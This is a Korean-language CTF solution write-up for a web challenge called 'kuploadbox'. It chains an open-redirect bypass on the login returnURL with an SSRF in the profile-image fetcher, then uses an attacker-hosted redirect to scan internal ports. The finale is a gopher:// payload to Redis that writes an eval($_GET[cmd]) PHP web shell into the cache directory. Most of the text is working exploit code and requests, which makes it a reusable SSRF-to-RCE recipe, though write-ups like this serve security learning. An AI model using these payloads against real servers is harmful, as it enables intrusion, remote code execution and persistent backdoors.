# solution

여기에는 취약점이 2개가 있는데 아래와 같다

1. open redirect 
2. SSRF

확인해야 할것 robots.txt

/cache directory 

1. open redirect는 로그인 할때 생김

웹 버그헌팅을 좀 하면 알겠지만 우선 다수의 사이트들에서 POST 파라메터를 GET으로 보내도 정상작동을 하는데 이걸 이용해서 Open redirect 취약점을 해야한다 하지만 필터링이 걸려있어 우회를 해줘야된다

1. http://adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=adm1nkyj3&pw=1234&returnURL=http://adm1nkyj.kr&send=login // fail

2. http://adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=adm1nkyj3&pw=1234&returnURL=http://adm1nkyj.kr%23@adm1nkyj-kuploadbox.com&send=login // fail

3. http://adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=adm1nkyj3&pw=1234&returnURL=http://test.adm1nkyj-kuploadbox.com&send=login // bypass

4. http://adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=adm1nkyj3&pw=1234&returnURL=http://adm1nkyj-kuploadbox.com.adm1nkyj.kr&send=login // fail

5. http://adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=adm1nkyj3&pw=1234&returnURL=http://exploit-adm1nkyj-kuploadbox.com&send=login // bypass 

open redirect 취약점을 찾았으면 이제 SSRF를 시도해보자

2. SSRF 프로필 변경 할때 생김.

프로필 변경 할때 보내는 POST body

```
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="pw"

1234
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="nick"

testidcc
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="profile"

http://files.adm1nkyj-kuploadbox.com/index.php
------WebKitFormBoundaryyx4ywOKfeaO8nCA7--

```

1. http://files.adm1nkyj-kuploadbox.com/index.php // 404 not found

2. http://aaaaaa-adm1nkyj-kuploadbox.com/index.php // check image url

3. http://testtest#@adm1nkyj-kuploadbox.com/index.php // check image url

4. http://adm1nkyj-kuploadbox.com.aaaaaaa/index.php // check image url

5. http://aaaaa-adm1nkyj-kuploadbox.com/index.php // check image url

6. http://www.adm1nkyj-kuploadbox.com/index.php // error! check file type

여기는 이미지 URL을 넣고 올바른 URL이라면 CURL로 긁어온 다음 이미지인지 아닌지 체크후 프로필을 변경 하는 구조이며 일반적인 URL로는 공격할수가 없지만 아까 킵해둔 Open Redirect 취약점으로 바이패스가 가능하다.

ex) http://www.adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=testid3&pw=1234&returnURL=http://exploit-adm1nkyj-kuploadbox.com/index.php&send=login

Open Redirect와 SSRF 취약점을 찾았으면 이제 내부 포트 스캐닝을 해보자 

ex)

exploit-adm1nkyj-kuploadbox.com/port.php source

```php
<?php
	header("Location: http://127.0.0.1:[port]");
?>
```

포트 스캐닝을 하다보면 6379 포트가 열려있는걸 알수가 있는데 6379포트를 구글에 검색 하게 되면 6379를 검색하게 되면 redis 기본 포트 란걸 알수 있게 된다 (https://www.google.co.kr/?gfe_rd=cr&ei=Av5YWbu7Iano8AfQ05rgBA&gws_rd=ssl#q=6379+port)

그후 redis를 이용해 cache폴더 웹쉘을 올리면 문제를 풀수있다.

redis command

```
FLUSHALL
eval 'redis.call("set", "<?php eval($_GET[cmd]); ?>", "test"); redis.call("config", "set", "dir", "/var/www/html/cache/"); redis.call("config", "set", "dbfilename", "exploit.php");' 0
save
quit

```

최종 exploit

exploit-adm1nkyj-kuploadbox.com/mytask_full_exploit_1.php

```php
<?php
        header("Location: gopher://127.0.0.1:6379/_FLUSHALL%0d%0aeval%20%27redis.call%28%22set%22%2C%20%22%3C%3Fphp%20eval%28%24_GET%5Bcmd%5D%29%3B%20%3F%3E%22%2C%20%22test%22%29%3B%20redis.call%28%22config%22%2C%20%22set%22%2C%20%22dir%22%2C%20%22/var/www/html/cache/%22%29%3B%20redis.call%28%22config%22%2C%20%22set%22%2C%20%22dbfilename%22%2C%20%22exploit.php%22%29%3B%27%200%0d%0asave%0d%0aquit%0d%0a");
?>
```

exploit POST body

```
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="pw"

1234
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="nick"

testidcc
------WebKitFormBoundaryyx4ywOKfeaO8nCA7
Content-Disposition: form-data; name="profile"

http://www.adm1nkyj-kuploadbox.com/index.php?ad=member&mi=login&id=testid3&pw=1234&returnURL=http://exploit-adm1nkyj-kuploadbox.com/mytask_full_exploit_1.php&send=login
------WebKitFormBoundaryyx4ywOKfeaO8nCA7--
```

하면 cache/exploit.php로 웹쉘이 올라간다.